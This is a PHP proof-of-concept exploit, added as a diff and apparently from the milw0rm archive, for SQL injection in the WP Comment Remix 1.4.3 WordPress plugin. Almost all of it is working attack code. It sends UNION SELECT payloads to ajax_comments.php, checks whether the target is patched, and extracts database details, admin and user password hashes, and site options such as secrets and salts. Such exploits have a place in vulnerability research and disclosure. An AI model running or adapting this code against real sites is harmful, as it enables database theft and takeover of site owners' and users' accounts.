@@ -1,0 +1,231 @@
+<?php
+	/**
+	 * WP Comment Remix 1.4.3 SQL Injection
+	 * Proof of Concept
+	 * By g30rg3_x <g30rg3x_at_chxsecurity_dot_org>
+	 *
+	 * Advisory:
+	 * http://chxsecurity.org/advisories/adv-3-full.txt
+	 *
+	 * PoC Mirror:
+	 * http://chxsecurity.org/proof-of-concepts/wp-comment-remix-143.zip
+	 *
+	 * Attention:
+	 * This is a Proof-of-Concept it was never intended to be fully functional
+	 *
+	 * Notes:
+	 * Uses cURL
+	 */
+
+	// Script Header
+	function head() {
+		print "\n WP Comment Remix 1.4.3 SQL Injection";
+		print "\n By g30rg3_x <g30rg3x_at_chxsecurity_dot_org>";
+		print "\n ------------------------------------------------";
+		print "\n This is a Proof-of-Concept it was never intended to be fully functional\n";
+	}
+
+	// Usage Information
+	function usage() {
+		global $argv;
+		head();
+		print "\n Usage: php {$argv[0]} <host> <path> <information> <table-prefix>\n";
+		print "\n  <host>: Hostname or IP Address";
+		print "\n  <path>: Path to WordPress (Defaults to: /)";
+		print "\n  <information>: Information to Extract (Defaults to: relevant)";
+		print "\n    dbinfo = Extract MySQL Current User, Database and Version";
+		print "\n    admins = Extract Only Admins (users with level 10)";
+		print "\n    users = Extract All Users (includes admins)";
+		print "\n    options = Extract Relevant Options like active_plugins, secret, ...";
+		print "\n    alloptions = Extrac All Options (Huge data would be directly printed out!)";
+		print "\n    relevant = dbinfo + admins + options";
+		print "\n    all = dbinfo + users + alloptions";
+		print "\n  <table-prefix>: WordPress Tables Prefix (Defaults to: wp_)\n";
+		print "\n Examples:";
+		print "\n  php {$argv[0]} foo.bar";
+		print "\n  php {$argv[0]} foo.bar /wordpress/";
+		print "\n  php {$argv[0]} foo.bar /wordpress/ all foo_";
+		print "\n";
+		exit();
+	}
+
+	// cURL HTTP GET
+	function GET($url) {
+		$ch = curl_init($url);
+		curl_setopt($ch, CURLOPT_HEADER, true);
+		curl_setopt($ch, CURLOPT_HTTPHEADER, array('Connection: Close'));
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		curl_setopt($ch, CURLOPT_USERAGENT, 'WP-Comment-Remix 1.4.3 SQL Injection Proof-of-Concept');
+		$result = curl_exec($ch);
+		curl_close($ch);
+
+		if ( preg_match('%HTTP/[0-9.x]+ 200 OK%', $result) )
+			return $result;
+		else
+			return false;
+	}
+
+	// Obtain Database Information
+	function obtainDBInfo() {
+		global $prefix, $url;
+		$injection = '/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,CONCAT(0x757365727B,user(),0x7D44427B,database(),0x7D76657273696F6E7B,version(),0x7D),10,11,12,13,14,15--';
+		$result = GET($url . $injection);
+		preg_match_all('/user\{(?P<user>.+)\}DB\{(?P<DB>.+)\}version\{(?P<version>.+)\}/', $result, $captured, PREG_PATTERN_ORDER);
+		$db['user'] = $captured['user'][0];
+		$db['name'] = $captured['DB'][0];
+		$db['version'] = $captured['version'][0];
+		return $db;
+	}
+
+	// Obtain WordPress Users Information
+	function obtainUsersInfo($all = false) {
+		global $prefix, $url;
+		$injection = "/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,CONCAT(0x757365727B,{$prefix}users.user_login,0x7D706173737B,{$prefix}users.user_pass,0x7D),10,11,12,13,14,15/**/FROM/**/{$prefix}users" . ( $all ? '' : ",{$prefix}usermeta/**/WHERE/**/{$prefix}users.ID={$prefix}usermeta.user_id/**/AND/**/{$prefix}usermeta.meta_key/**/REGEXP/**/0x757365725F6C6576656C/**/AND/**/{$prefix}usermeta.meta_value=10" ) . '--';
+		$result = GET($url . $injection);
+		preg_match_all('/user\{(?P<user>.+)\}pass\{(?P<pass>.+)\}/', $result, $captured, PREG_PATTERN_ORDER);
+		for( $i = 0; $i < count($captured['user']); $i++ )
+			$users[$captured['user'][$i]] = $captured['pass'][$i];
+		return $users;
+	}
+
+	// Obtain WordPress Options Information
+	function obtainOptionsInfo($all = false) {
+		global $prefix, $url;
+		$injection = "/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,CONCAT(option_name,0x7B7C,option_value,0x7C7D),10,11,12,13,14,15/**/FROM/**/{$prefix}options" . ( $all ? '' : '/**/WHERE/**/option_name/**/REGEXP/**/0x7369746575726C7C6C6F67696E7C757365727C706173737C617574687C7365637265747C73616C747C6163746976655F706C7567696E737C73656564' ) . '--';
+		$result = GET($url . $injection);
+		preg_match_all('%<p>(?P<name>.+)\{\|(?P<value>.+)\|\}</p>%', $result, $captured, PREG_PATTERN_ORDER);
+		for( $i = 0; $i < count($captured['name']); $i++ )
+			$options[$captured['name'][$i]] = $captured['value'][$i];
+		return $options;
+	}
+
+	// Set no time limit (only if safe mode is off)
+	if ( !ini_get('safe_mode') )
+		set_time_limit(0);
+
+	// Print usage if there is no host
+	if ( !isset($argv[1]) )
+		usage();
+
+	// Header, Arguments and Generate URL
+	head();
+	$host = $argv[1];
+	$path = isset($argv[2]) ? $argv[2] : '/';
+	$info = isset($argv[3]) ? $argv[3] : 'relevant';
+	$prefix = isset($argv[4]) ? $argv[4] : 'wp_';
+	$url = 'http://' . $host . $path . 'wp-content/plugins/wp-comment-remix/ajax_comments.php?p=0';
+
+	// Check if we can reach "ajax_comments.php"
+	print "\n Does ajax_comments.php exist? ... ";
+	$result = GET($url);
+	if ( !$result ) {
+		print "No";
+		print "\n -----------------------------------------------------------";
+		print "\n Seems that the site does not have WP Comment Remix installed";
+		print "\n OR the path you proportionate is incorrect.";
+		print "\n Please review your arguments and try again.\n";
+		exit();
+	}
+	print 'Yes';
+
+	// Check if is it possible to inject...
+	// ToDo: Some WordPress installations return more than 15 columns (this is caused by some plugins that alter
+	// the comments table structure and don't revert back this change) so this injection may fail A LOT in a non-default
+	// enviroment (ie. sites with many plugins), so if you REALLY want this PoC to be more "functional" then improve
+	// this part of the PoC; it was never my intention to deliver a "fully functional" Proof-of-Concept.
+	print "\n Can we Inject SQL Code? ... ";
+	$result = GET($url . '/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--');
+	if ( preg_match('/There are no comments for this post/', $result) ) {
+		print "No";
+		print "\n --------------------------------------";
+		print "\n Seems that the host is already patched.\n";
+		exit();
+	}
+	print 'Yes';
+
+	// Check table prefix but don't check if the user selected to obtain database information.
+	if ( $info != 'dbinfo') {
+		print "\n Is \"{$prefix}\" the table prefix? ... ";
+		$result = GET($url . "/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15/**/FROM/**/{$prefix}users--");
+		if ( preg_match('/There are no comments for this post/', $result) ) {
+			print "No";
+			print "\n ------------------------------------------------";
+			print "\n Seems that the table prefix \"{$prefix}\" is incorrect.";
+			print "\n But this time we are not exiting, cause we can still extract";
+			print "\n the database information, so m just going to change your choice";
+			print "\n to dbinfo so you can still get that valuable information.";
+			print "\n ------------------------------------------------\n";
+			$info = 'dbinfo';
+		} else {
+			print 'Yes';
+		}
+	}
+
+	// Now is time to inject
+	print "\n\n Seems that everything is fine so now it's super fun time :P...";
+	switch($info) {
+		case 'all':
+			$db = obtainDBInfo();
+			$users = obtainUsersInfo(true);
+			$options = obtainOptionsInfo(true);
+			break;
+		case 'relevant':
+			$db = obtainDBInfo();
+			$users = obtainUsersInfo();
+			$options = obtainOptionsInfo();
+			break;
+		case 'dbinfo':
+			$db = obtainDBInfo();
+			break;
+		case 'admins':
+			$users = obtainUsersInfo();
+			break;
+		case 'users':
+			$users = obtainUsersInfo(true);
+			break;
+		case 'options':
+			$options = obtainOptionsInfo();
+			break;
+		case 'alloptions':
+			$options = obtainOptionsInfo(true);
+			break;
+	}
+
+	/* It's Show Time */
+
+	// Database Information
+	if ( !empty($db) ) {
+		print "\n\n Database Information";
+		print "\n ---------------------";
+		print "\n MySQL User: {$db['user']}";
+		print "\n MySQL Version: {$db['version']}";
+		print "\n MySQL Database Name: {$db['name']}";
+	}
+
+	// Users Information
+	if ( !empty($users) ) {
+		print "\n\n Users";
+		print "\n ---------";
+		foreach( (array) $users as $user => $pass ) {
+			print "\n Username: {$user}";
+			print "\n Password: {$pass}  " . ( strlen($pass) <= 32 ? '(MD5)' : '(Passhash)' );
+			print "\n ---------";
+		}
+	}
+
+	// Options Information
+	if ( !empty($options) ) {
+		print "\n\n Options";
+		print "\n ---------";
+		foreach( (array) $options as $name => $value ) {
+			print "\n Name: {$name}";
+			print "\n Value: {$value}";
+			print "\n ---------";
+		}
+	}
+
+	// Good Bye =)
+	print "\n\n Have Fun! =)\n";
+?>
+
+# milw0rm.com [2008-10-14]
